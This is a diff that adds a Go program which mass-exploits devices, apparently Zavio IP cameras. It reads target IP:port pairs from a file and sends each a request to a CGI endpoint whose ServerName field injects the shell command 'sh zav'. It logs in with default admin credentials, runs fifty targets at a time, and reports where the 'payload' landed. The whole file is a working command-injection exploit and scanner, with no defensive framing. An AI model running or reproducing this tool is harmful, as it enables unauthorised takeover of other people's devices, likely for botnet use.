@@ -1,0 +1,86 @@
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "net/http"
+    "os"
+    "sync"
+    "time"
+    "net"
+)
+
+func main() {
+
+    file, err := os.Open("ips.txt")
+    if err != nil {
+        fmt.Println("Error opening file:", err)
+        return
+    }
+    defer file.Close()
+
+    scanner := bufio.NewScanner(file)
+    var wg sync.WaitGroup
+    semaphore := make(chan struct{}, 50)
+
+    for scanner.Scan() {
+        ipPort := scanner.Text()
+        url := "http://" + ipPort + "/cgi-bin/operator/servetest?cmd=ntp&ServerName=;sh%20zav&TimeZone=08:00"
+
+        semaphore <- struct{}{}
+        wg.Add(1)
+
+        go func(ipPort, url string) {
+            defer func() {
+                <-semaphore
+                wg.Done()
+            }()
+
+            req, err := http.NewRequest("GET", url, nil)
+            if err != nil {
+               // fmt.Println("Error creating request:", err)
+                return
+            }
+
+            req.Header.Set("Host", ipPort)
+            req.Header.Set("Cache-Control", "max-age=0")
+            req.Header.Set("Authorization", "Basic YWRtaW46YWRtaW4=")
+            req.Header.Set("If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT")
+            req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36")
+            req.Header.Set("Accept", "*/*")
+            req.Header.Set("Referer", "http://"+ipPort+"/system_datetime.htm?stamp=Tue%20Jul%2023%2018:48:07%20CST%202013")
+            req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+            req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+            req.Header.Set("Cookie", "ProfileIdx=0; DisplayIdx=1; LastCGICMD=cgi-bin/operator/servetest%3Fcmd%3Dntp%26ServerName%3D%3Bsh%20zav%26TimeZone%3D08%3A00%0A%20%0A")
+            req.Header.Set("Connection", "close")
+
+            client := &http.Client{
+                Timeout: 5 * time.Second, 
+            }
+
+            resp, err := client.Do(req)
+            if err != nil {
+                if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+
+                    //fmt.Printf("Timed out for %s\n", ipPort)
+                    return
+                }
+                //fmt.Println("Error sending request:", err)
+                return
+            }
+            defer resp.Body.Close()
+
+            if resp.StatusCode == http.StatusOK {
+                fmt.Printf("[zavio] payload sent to: %s\n", ipPort)
+            } else {
+                //fmt.Printf("Login failed for %s. Response Status Code: %s\n", ipPort, resp.Status)
+            }
+        }(ipPort, url)
+    }
+
+    wg.Wait()
+
+    if err := scanner.Err(); err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+    }
+}
